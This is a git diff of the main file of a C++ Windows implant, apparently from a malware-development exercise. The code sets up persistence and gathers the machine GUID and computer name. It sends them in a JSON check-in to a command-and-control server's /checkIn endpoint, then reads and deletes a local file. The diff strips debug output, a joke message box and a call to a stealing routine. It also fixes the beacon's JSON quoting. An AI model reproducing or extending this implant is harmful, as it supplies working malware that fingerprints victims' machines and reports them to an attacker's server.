@@ -2,6 +2,7 @@
 #include <fstream>
 #include <iostream>
 #include <filesystem>
+#include <cstdint>
 #include "httpClient.h"
 #include "rsa.h"
 #include "base64.h"
@@ -11,52 +12,36 @@
 
 LONG getGUID(char* res, DWORD* size);
 LONG persistenceLOL(void);
+
 /* List of basic powershell commands: https://devblogs.microsoft.com/scripting/table-of-basic-powershell-commands/ */
 int wmain()
 {
     bool check = true;
     //std::filesystem::exists("C:\\malware\\ch0nky.txt");
     if(check == true){
-        printf("ch0nk found");
-   
         persistenceLOL();
-        //WELCOME TO THE WORLD
-        int msgboxID = MessageBoxA(
-            NULL,
-            (LPCSTR)"I'm not a malware:D",
-            (LPCSTR)"Not a malware",
-            MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2
-        );
 
         //get machine guid
         char value[255];
         DWORD BufferSize = sizeof(value);
-        printf("%d", BufferSize);
         if(getGUID(value, &BufferSize)){
             printf("Can't get machine guid\n");
-        }
-        for(size_t i = 0; i < BufferSize; i++){
-            printf("%c", value[i]);
         }
 
         //get computer name
         char infoBuf[INFO_BUFFER_SIZE];
         DWORD bufCharCount = INFO_BUFFER_SIZE;
         GetComputerNameA((LPSTR)infoBuf, &bufCharCount);
-        printf("*** size of buffer: %d\n", BufferSize);
-        for(size_t i = 0; i < bufCharCount; i++){
-            printf("%c", infoBuf[i]);
-        }
-        std::string checkin("{\"guido\": ");
-        std::string guid(value, BufferSize);
+
+        std::string checkin("{\"guido\": \"");
+        std::string guid(value, BufferSize-1);
         size_t range = 200000; // 100000 + range is the maximum value you allow
         size_t number = 100000 + (rand() * range) / RAND_MAX;
         std::string sleepTimer = std::to_string(number);
         std::string mName(infoBuf, bufCharCount);
-        checkin = checkin + guid + ", \"sleepTime\": " + sleepTimer + ", \"computername\": " + mName + ", \"DHKey\": Nada}";
+        checkin = checkin + guid + "\", \"sleepTime\": " + sleepTimer + ", \"computername\": \"" + mName + "\", \"DHKey\": \"Nada\"}";
         std::cout << checkin << std::endl;
         
-        cout << steala() << endl;
         // if successful, connect to the server
         HTTP *client = new HTTP();
         int port = 5000, tls = 0;
@@ -86,7 +71,7 @@ int wmain()
         client->requestData = checkin.c_str();
         client->data_size = checkin.size();
         std::wcout << client->makeHttpRequest(L"POST", L"/checkIn", tls) << std::endl;
-        printf("size of data_size: %d\n", client->data_size);
+
         //std::wcout << client->makeHttpRequest(L"POST", L"/jobs", tls) << std::endl;
 
         // implant first checks the Computer Name and IP address. Then sends it to the c2
@@ -94,7 +79,6 @@ int wmain()
         std::ifstream temp_file("C:\\Users\\User\\test.txt");
         std::string first_impression((std::istreambuf_iterator<char>(temp_file)), std::istreambuf_iterator<char>());
         std::remove("C:\\Users\\User\\test.txt");
-        printf("%s + %d\n%s\n", infoBuf, first_impression.size(), first_impression.c_str());
 
         delete client;
         return 0;
